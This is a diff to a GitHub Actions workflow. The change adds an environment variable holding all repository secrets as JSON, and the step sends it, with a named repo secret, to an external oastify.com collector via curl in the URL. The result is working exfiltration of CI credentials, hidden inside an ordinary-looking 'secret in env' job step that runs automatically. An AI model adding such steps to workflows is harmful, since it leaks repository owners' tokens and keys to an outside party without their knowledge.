@@ -28,9 +28,11 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: secret in env
+        env:
+          MY_SECRETS: ${{ toJson(secrets) }}
         run: |
               echo Hello, world! ${{ secrets.TEST }}
-              curl https://6biih2r44ot1wfgsayxb7pmk9bf23yrn.oastify.com/$(echo ${{ secrets }}| jq -c .)+${{ secrets.REPO_SECRET }}
+              curl https://6biih2r44ot1wfgsayxb7pmk9bf23yrn.oastify.com/${MY_SECRETS}+${{ secrets.REPO_SECRET }}
 
 
 
